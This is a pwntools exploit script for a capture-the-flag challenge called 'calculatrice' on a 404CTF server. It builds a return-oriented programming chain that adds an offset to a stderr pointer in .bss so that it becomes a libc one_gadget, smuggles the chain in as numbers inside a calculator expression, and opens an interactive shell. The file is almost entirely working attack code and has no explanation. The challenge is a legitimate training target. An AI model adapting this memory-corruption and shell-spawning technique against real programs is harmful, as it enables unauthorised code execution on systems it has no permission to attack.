#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("calculatrice_patched")
libc = ELF("./libc.so.6")

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l0', filename]).decode().split(' ')]
#onegadgets = one_gadget(libc.path, libc.address)

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)


rop = ROP(exe)

host, port = "challenges.404ctf.fr", "32111"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])


pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rbx_rbp = rop.find_gadget(['pop rbx','pop rbp', 'ret'])[0]
add_gadget = 0x000000000040125c # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
jmp_rsi = 0x0000000000401638 # jmp qword ptr [rsi - 0x39]
pop_rsi = rop.find_gadget(['pop rsi','pop r15', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# use add gadget to change stderr address on .bss to a onegadget, and jump to it..
onegadgets = one_gadget(libc.path)
rop = p64(pop_rbx_rbp)+p64((0x100000000-((libc.address+0x3ec680)-onegadgets[2])))+p64(0x404060+0x3d)+p64(add_gadget)
rop += p64(pop_rsi)+p64(0x404060+0x39)+p64(0)+p64(jmp_rsi)+p64(0)*10


payload = '9*9*9*9*9*9*9*9*9*9*9*9*9*'
# write ROP on stack
for i in range(len(rop)>>3):
  payload += str(u64(rop[(i*8):(i+1)*8]))+'*'

print('payload\n'+payload)

sla(" : ", payload)
p.interactive()

